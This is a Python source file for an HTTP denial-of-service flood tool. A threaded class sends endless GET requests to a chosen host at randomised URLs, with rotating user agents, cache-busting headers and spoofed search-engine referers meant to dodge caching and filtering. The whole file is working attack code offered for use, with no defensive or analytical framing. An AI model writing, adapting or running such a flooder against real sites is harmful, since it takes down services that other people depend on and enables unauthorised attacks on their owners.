import random
import string
from random import randrange

from requests import request as req
import threading
from print_color import print


class DdosRequest(threading.Thread):
    cache_type = ['no-cache', 'no-store', 'max-age=' + str(random.randint(0, 10)),
                  'max-stale=' + str(random.randint(0, 100)),
                  'min-fresh=' + str(random.randint(0, 10)), 'notransform', 'only-if-cache']
    accept_encode = ['compress,gzip', '', '*', 'compress;q=0,5, gzip;q=1.0', 'gzip;q=1.0, indentity; q=0.5, *;q=0']
    accept_C = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
    bots = ['http://www.bing.com/search?q=%40&count=50&first=0',
            'http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8']
    target = ''

    def __init__(self, target: str, port: int = None):
        threading.Thread.__init__(self)
        self.target = target
        self.ssl = False
        self.req = []
        self.lock = threading.Lock()
        self.port = port

    @staticmethod
    def rand_str():
        my_str = []
        for x in range(3):
            chars = tuple(string.ascii_letters + string.digits)
            text = (random.choice(chars) for _ in range(random.randint(7, 14)))
            text = ''.join(text)
            my_str.append(text)
        return '&'.join(my_str)

    @staticmethod
    def fake_ip():
        res = ''
        while True:
            ips = [str(randrange(0, 256)) for i in range(4)]
            if ips[0] == "127":
                continue
            res = '.'.join(ips)
            break
        return res

    @staticmethod
    def get_useragent():
        file = open('worldlist/ua.txt')
        file = file.readlines()
        res: str = random.choice(file)
        return res.replace('\n', '')

    def header(self):
        return {
            'User-Agent': self.get_useragent(),
            'Cache-Control': random.choice(self.cache_type),
            'Accept-Encoding': random.choice(self.accept_encode),
            'Keep-Alive': '42',
            'Host': self.target,
            'Referer': random.choice(self.bots)
        }

    def run(self):
        port = f':{self.port}' if self.port else ''
        url = f'{self.target}{port}/{self.rand_str()}'

        try:
            res = req(
                method='GET',
                url=url,
                headers=self.header()
            )
            if res.status_code < 300:
                print(url, tag_color='g', tag=f"{res.status_code}")
            if 300 < res.status_code < 400:
                print(url, tag_color='y', tag=f"{res.status_code}")
            else:
                print(url, tag_color='r', tag=f"{res.status_code}")

        except Exception as e:
            print(e)
            pass


def run_ddos_request(host: str, port: int, user_thread: int):
    threads = []
    while True:
        try:
            for x in range(int(user_thread)):
                t = DdosRequest(target=host, port=port)
                t.start()
                t.join()
        except KeyboardInterrupt:
            exit(101)



